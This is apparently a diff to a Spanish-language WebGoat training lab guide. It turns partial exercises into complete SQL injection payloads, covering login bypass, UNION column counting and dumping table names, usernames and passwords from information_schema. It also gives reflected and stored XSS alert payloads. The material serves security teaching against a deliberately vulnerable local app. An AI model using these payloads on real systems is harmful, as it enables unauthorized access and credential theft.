@@ -90,30 +90,48 @@ http://localhost:8080/WebGoat
 
 **Tu tarea**: Probar payloads en el campo de usuario del formulario de login.
 
-**Payloads parciales para completar:**
+**Payloads para probar (escribir manualmente):**
 ```bash
 # En formulario de login, probar:
-___'--
-___' OR '1'='1
-___' UNION SELECT NULL--
+'--
+' OR '1'='1
+' UNION SELECT NULL--
+' UNION SELECT 1,2,3--
 ```
 
-**Pista**: El payload básico usa comillas simples para cerrar la consulta SQL.
+**Pista**: El payload básico usa comillas simples para cerrar la consulta SQL. El número de columnas debe coincidir con la consulta original.
 
 **Resultado esperado**: Deberías ver un bypass de autenticación o datos extraídos de la base de datos.
 
-#### Paso 2: Extraer información de la base de datos
+#### Paso 2: Determinar número de columnas
+
+**Tu tarea**: Encontrar el número correcto de columnas para UNION SELECT.
+
+**Comandos para probar (incrementar hasta que funcione):**
+```bash
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+```
+
+**Resultado esperado**: Cuando el número de columnas es correcto, no verás error de "The used SELECT statements have a different number of columns".
+
+#### Paso 3: Extraer información de la base de datos
 
 **Tu tarea**: Usar UNION SELECT para extraer información de la base de datos.
 
-**Comando parcial:**
+**Comandos para probar:**
 ```bash
-___' UNION SELECT 1,table_name,NULL FROM information_schema.tables--
+' UNION SELECT 1,table_name,3 FROM information_schema.tables--
+' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT 1,username,3 FROM users--
+' UNION SELECT 1,password,3 FROM users--
 ```
 
-**Pista**: `information_schema.tables` contiene los nombres de todas las tablas.
+**Pista**: Primero encuentra las tablas, luego las columnas de esas tablas, finalmente extrae los datos.
 
-**Resultado esperado**: Lista de tablas de la base de datos.
+**Resultado esperado**: Lista de tablas, columnas y finalmente credenciales de usuarios.
 
 ### 3.2. Cross-Site Scripting (A07:2021 - XSS)
 
@@ -123,37 +141,31 @@ ___' UNION SELECT 1,table_name,NULL FROM information_schema.tables--
 
 **Tu tarea**: Buscar campos de entrada que no sanitizen el input.
 
-**Comandos parciales para probar:**
+**Comandos para probar (escribir manualmente):**
 ```bash
 # En campos de búsqueda o comentarios:
-___
-___
+<script>alert('XSS')</script>
+<svg onload=alert('XSS')>
+<img src=x onerror=alert('XSS')>
 ```
 
-**Payloads parciales:**
-```javascript
-<script>alert(document.cookie)</script>
-<svg onload=alert(1)>
-<img src=x onerror=alert(1)>
-```
+**Pista**: Busca campos donde puedas insertar HTML/JavaScript que se ejecute al cargar la página o al interactuar con el elemento.
 
-**Pista**: Busca campos donde puedas insertar HTML/JavaScript.
-
-**Resultado esperado**: Alerta de JavaScript ejecutada en el navegador.
+**Resultado esperado**: Alerta de JavaScript ejecutada en el navegador que muestra 'XSS'.
 
 #### Paso 2: XSS Almacenado
 
 **Tu tarea**: Encontrar un punto donde el XSS se almacene y se ejecute en otros usuarios.
 
-**Comando parcial:**
+**Comando para probar:**
 ```bash
 # Insertar payload en campo que se muestra a otros usuarios:
-___
+<script>alert('XSS Stored')</script>
 ```
 
-**Pista**: Busca funcionalidades como comentarios, perfiles o mensajes.
+**Pista**: Busca funcionalidades como comentarios, perfiles, mensajes o cualquier campo donde tu entrada se guarde y se muestre a otros usuarios posteriormente.
 
-**Resultado esperado**: Captura de pantalla del `alert()` ejecutándose.
+**Resultado esperado**: Captura de pantalla del `alert()` ejecutándose cuando otro usuario ve la página donde se almacenó el XSS.
 
 ### 3.3. Broken Access Control (A01:2021 - Control de Acceso Roto)
 
